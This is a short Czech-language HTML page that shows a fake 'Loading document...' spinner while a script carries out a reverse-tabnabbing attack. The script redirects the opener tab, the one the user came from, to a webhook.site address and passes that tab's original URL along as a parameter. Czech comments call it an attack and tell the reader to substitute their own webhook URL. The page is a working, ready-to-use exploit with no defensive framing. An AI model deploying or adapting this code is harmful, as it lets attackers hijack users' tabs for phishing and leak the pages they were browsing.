<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <title>Načítání dokumentu...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f4f4; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin-right: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h1>Načítání dokumentu...</h1>

    <script>
      // Tento skript se pokusí ovládnout kartu, ze které uživatel přišel
      if (window.opener && !window.opener.closed) {
        try {
          // Přesměrování původního tabu na tvůj Webhook + přidání původní URL jako parametr
          // Nahraď URL svou adresou z webhook.site
          const webhookUrl = "https://webhook.site";
          window.opener.location = webhookUrl + "?origin=" + encodeURIComponent(window.opener.location.href);
        } catch (e) {
          console.error("Útok selhal, pravděpodobně kvůli Cross-Origin omezení prohlížeče.");
        }
      }
    </script>
</body>
</html>
